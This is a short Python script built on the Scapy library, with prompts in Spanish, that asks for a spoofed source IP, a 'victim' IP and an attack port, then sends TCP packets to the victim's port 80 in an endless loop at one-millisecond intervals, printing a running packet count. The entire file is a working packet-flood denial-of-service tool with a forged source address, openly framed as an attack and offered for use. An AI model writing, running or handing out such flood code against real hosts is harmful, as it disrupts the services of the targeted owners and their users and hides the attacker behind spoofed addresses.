# -*- coding: utf-8 -*-

from scapy.all import *

src = input("Ingrese la Ip de donde proviene el ataque: ")
victima = input("Ingresa el Ip de la victima")
puerto_ataque = int(input("Ingresa el puerto por el cual haras el ataque: "))

numero_paquete = 1

while True:
    IP1 = IP(src=src, dst=victima)
    TCP1= TCP(sport=puerto_ataque, dport=80)
    pkt=IP1 / TCP1
    send(pkt,inter=.001)
    print("Paquete enviado numero: ",numero_paquete)
    numero_paquete=numero_paquete+1
